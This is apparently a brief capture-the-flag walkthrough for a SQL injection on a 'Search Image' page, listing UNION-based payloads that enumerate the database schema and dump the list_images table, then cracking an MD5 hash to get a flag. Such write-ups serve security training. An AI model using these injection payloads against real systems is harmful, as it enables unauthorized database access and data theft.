# SQL Injection Image

1. Go on "Search Image" page.
2. Display the names of tables and columns in the database using `1 UNION select table_name, column_name FROM information_schema.columns`.
3. Retrieve values from the `url` and `comment` columns of the `list_images` table using `1 UNION select url, comment FROM list_images`.
4. Decrypt the password using MD5, lower all the characters and then encrypt it in SHA-256.


